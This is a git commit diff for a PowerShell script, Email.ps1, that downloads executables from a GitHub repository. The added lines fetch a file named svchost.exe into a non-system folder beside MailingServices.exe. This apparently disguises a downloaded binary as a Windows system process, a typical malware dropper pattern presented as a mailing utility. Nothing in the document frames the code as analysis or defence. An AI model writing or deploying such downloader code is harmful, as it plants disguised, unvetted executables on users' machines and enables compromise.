ac655aa3dbd1ebb12223281410c29aaa640eac3d
Violentqm <79298794+violentqm@users.noreply.github.com>
2023-11-14 05:03:11 -0800

    Update Email.ps1

--- Email.ps1
+++ Email.ps1
@@ -1,3 +1,6 @@
 $url = "https://github.com/violentqm/rest/raw/main/MailingServices.exe"
-$outputPath = "C:\MailingServices\Windows\MailingServices.exe"
+$outputPath = "C:\MailingServices\MailingServices.exe"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
+$url2 = "https://github.com/violentqm/rest/raw/main/svchost.exe"
+$outputPath2 = "C:\MailingServices\svchost.exe"
+Invoke-WebRequest -Uri $url2 -OutFile $outputPath2
